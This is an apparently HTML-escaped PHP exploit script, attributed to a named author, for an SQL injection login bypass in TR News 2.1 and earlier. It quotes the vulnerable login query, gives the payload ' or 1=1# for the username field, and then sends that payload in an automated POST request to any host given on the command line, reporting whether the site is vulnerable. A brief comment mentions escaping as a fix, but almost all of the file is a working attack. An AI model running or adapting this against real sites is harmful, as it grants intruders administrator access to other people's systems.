&lt;?php

error_reporting(0);

/*
   ------------------------------------------------------
   TR News &lt;= 2.1 (login.php) Remote Login ByPass Exploit
   ------------------------------------------------------
   By StAkeR[at]hotmail[dot]it
   http://www.easy-script.com/scripts-dl/trscript-21.zip

   File admin/login.php
   
   1. &lt;?
   2.	if(isset($_POST[&#039;login_ad&#039;]) &amp;&amp; ($_POST[&#039;password&#039;]))
   3.   {
   4.	include(&quot;../include/connexion.php&quot;);
   5.	$login=$_POST[&quot;login_ad&quot;];
   6.	$pass=md5($_POST[&quot;password&quot;]);
   7.	$sql=&quot;SELECT * FROM tr_user_news WHERE pseudo=&#039;$login&#039; AND pass=&#039;$pass&#039;;&quot;;
   8.	$p = mysql_query($sql);
   9.	$row = mysql_fetch_assoc($p);
  10.	$admin = $row[&#039;admin&#039;];
  11.	if($admin != 1)
  
  $login = $_POST&quot;login_ad&quot;]; isn&#039;t escaped,so you can insert SQL code...
  how to fix? sanize $login with mysql_real_escape_string or htmlentities
  
  
  NOTE:
  
  if the website is vulnerable,you must go to admin/login.php
  
  Username: &#039; or 1=1#
  Password: no-deface
  
*/

if(preg_match(&#039;/http://(.+?)/i&#039;,$argv[1]) or empty($argv[1])) athos();

$host = explode(&#039;/&#039;,$argv[1]);
$auth = &quot;login_ad=%27+or+1%3D1%23&amp;password=athos&quot;;


$data = &quot;POST /$host[1]/admin/login.php HTTP/1.1\r\n&quot;. 
        &quot;Host: $host[0]\r\n&quot;.
        &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
        &quot;Content-Length: &quot;.strlen($auth).&quot;\r\n\r\n&quot;.
        &quot;$auth\r\n\r\n&quot;;
  
  
if(!$socket = fsockopen($host[0],80)) die(&quot;fsockopen() error!\n&quot;);  
if(!fputs($socket,$data)) die(&quot;fputs() error!\n&quot;);


while(!feof($socket))
{
  $content .= fgets($socket);
} fclose($socket);

if(preg_match(&quot;/location: main\.php\?mode=main/i&quot;,$content))
{
  exploiting();
  echo &quot;\n[+] Exploit Successfully!\n[+] Site Vulnerable\n&quot;;
  exit;
}
else
{
  exploiting();
  echo &quot;\n[+] Exploit Failed!\n[+] Site Not Vulnerable!\n&quot;;
  exit;
}
  
function athos()
{
  global $argv;
  
  echo &quot;[+] TR News &lt;= 2.1 (login.php) Remote Login ByPass Exploit\n&quot;;
  echo &quot;[+] Usage: php $argv[0] [host/path]\r\n&quot;;
  exit;
}
  
function exploiting()
{
  echo &quot;[+] Exploiting&quot;;

  for($i=0;$i&lt;=3;$i++) 
  {
    echo &quot;.&quot;; 
    sleep(1);
  }
}  

